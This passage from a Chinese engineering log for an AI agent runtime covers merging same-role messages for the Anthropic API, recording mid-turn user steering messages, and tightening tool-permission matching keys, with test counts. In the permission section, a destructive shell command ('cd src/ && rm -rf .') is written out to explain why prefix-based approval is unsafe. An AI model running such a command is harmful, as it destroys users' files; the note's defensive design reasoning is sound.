   - **原前提有一半站不住（本轮核查后修正）**：原文写“连续两条 user → 400”。Anthropic API 参考对 `messages` 参数的**原话是反的**——`Consecutive user or assistant turns in your request will be combined into a single turn.`（`docs.anthropic.com` 的 en / fr 两版、`console.anthropic.com`、`platform.claude.com` 的 csharp / cli 两版，5 个官方镜像**逐字一致**）。而第三方“roles must alternate”的 400 报告也大量存在（含一篇标注 Verified 2026-04），两种说法不可能同时严格成立，**本机无法裁定**（官方站点在此网络返回 `app-unavailable-in-region`；无 key 可实测）。另查明真正硬的 Anthropic 规则是 `tool_use` 必须紧跟配对的 `tool_result`——那条没有任何自动合并能救，多数 400 疑为把它误读成“角色交替”。→ 结论：**修法不变，措辞从“必然 400”改成“不应依赖服务端归一化”**。
   - **怎么修的**：落盘与归并两件事同轮做，且**与争议前提解耦**——本地同角色归并是幂等的：服务端本会合并时它无害，服务端真的拒绝时它救命，**两种世界里都正确**。
     1. **落盘**（`runtime.ts`）：`runSingleTurn` 用 `takeSteer` 回调把**被内层吸收**的引导收进本轮缓冲，在 `appendMessage('assistant', finalText)` **之前**按序落盘为独立 user 条目，内容带 `STEER_PREFIX`（`[用户引导] `）。位置是关键——引导发生在“用户提问”与“助手回复”之间，落在 assistant 之后就是错的时序。
     2. **归并**（`anthropic.ts`）：`toAnthropicMessages` 的 `user` 分支从**无条件 push** 改成**能并则并**（上一条已是 user 就把文本块并进去），与它本来就在做的连续 tool 结果合并同层、同一手法——这同时把原文点名的那个洞堵上了。
     3. **可见**（`/history`）：`getHistoryMessages()` 增返回 `steer: boolean`（按内容前缀判定），`/history` 把这类条目标成 `⚡ 中途引导` 而不是 `👤 你`。
   - **为什么用内容前缀而不是给 `MessageEntry` 加结构化字段**：`session/in-memory.ts` 与 `mock.ts` 的 `appendMessage(role, content)` **根本不接第三个参数**，extra 会被静默丢弃 → 同一条引导会“JSONL 里存得下、内存 / Mock 里凭空消失”，重演第 9 条“格式支持、入口未接线”的病。走 `role + content` 则三个后端天然一致。
   - **与第 9 条的关系**：两条都是“消息形状在历史里被削平”的不同侧面——第 9 条削的是工具调用结构（那道丢弃**承重**，保住 extended thinking），本条削的是中途引导（**已修**）。两条的处理手法刻意不同：第 9 条不动，本条落盘——因为第 9 条的出口堵着是为了保住另一个机制，而本条没有任何机制需要保护。
   - **已知代价（刻意的不对称，已登记为断言）**：落盘成独立 user 条目后，**OpenAI 兼容路径会真的发出连续两条 user**（该路径原样透传、零归一化）。标准 OpenAI 语义容忍它，故风险低，但这是本方案唯一无法替服务端担保的地方——用 `verify-steering.ts` 的 S10 钉住，不埋在注释里。
   - **怎么看它是否生效**：`scripts/verify-steering.ts` 48 项。S8 钉落盘（位置在 assistant 之前 / 带标记 / `/history` 标出，并带“无引导时形状不变”的对照组）；S9 起真 `http` 服务器抓**真实请求体**，钉“三条并成两条、正文不丢不粘、序列严格交替”，并带“无相邻同角色时不合并”与“连续 tool 结果仍合并”两条对照组；S10 钉 OpenAI 路径的不对称。**四组变异测试各自精准变红**：摘掉适配器归并 → S9-1/2/3；摘掉落盘 → S8-1/3/4/5/6/7；落盘挪到 assistant 之后 → S8-3/4/5/7；去掉标记前缀 → S8-3/6/7。
     - **为什么不选“把键换成真路径、让前缀匹配生效”**：前缀匹配要求键本身是路径语义才安全，而键由工具自定义——`bash` 的键是完整命令，`cd src/` 就以 `/` 结尾，按“以 / 结尾就前缀放行”等于批准 `cd src/ && rm -rf .`。**目录级授权明确不做**，要做得先有一个“只按路径授权”的独立入口（`verify-permission.ts` C10 / C11 把这条钉死）
     - **一处刻意的放宽**：`write` / `edit` 的键是路径不是内容，所以“本次全部允许” = 本会话内不再问这个文件（改前是“路径 + `oldText` 前 38 字符”，在那个维度上本轮放宽了），换来的是这个选项真的有用。取舍见 [DECISION_LOG.md](./DECISION_LOG.md)，术语见 [GLOSSARY.md](./GLOSSARY.md#permissionkey授权匹配键)
     - **断言**：新增 `scripts/verify-permission.ts`（62 项、7 段），含“改前的截断键确实把 76 字符命令与 104 字符命令判成同一个键”的**对照组**（C1 / C2）与反例钉死（C4 / C7 / C10 / C11），以及 `clear()` 接线的**行为证明**（⑦ 段造真 `Runtime` 数它被调了几次）。该轮收尾时全量 14 套 482 项、`tsc --noEmit` 均 EXIT=0（同日深夜又给 grep / bash 建了 `verify-tools.ts`，现为 15 套 556 项，见上面第二节对比表）
     - 上面原状里那句“6 处测试替身……`clear()` 一个都没实现”：现在是 **7 处**，其中 `verify-permission.ts` 那处**刻意实现了** `clear()`（就为了数它被调了几次），其余 6 处仍只给两个方法。但原状里“靠 `as any` / `as never` 绕过类型检查”这半句只说对了一半：cast 确实每处都有（`: any`（phase-ab）/ `as never`（c2 / c3 / usage / events）/ 整个 options 对象 `as any`（session）），但**它不是不报错的真因**——`tsconfig.json` 的 include 只有 `src/**/*.ts`，`scripts/` 根本不进 tsc（tsx 只剥类型不检查），所以契约即使把 `clear()` 改成必需方法，把 cast 去掉也照样不报
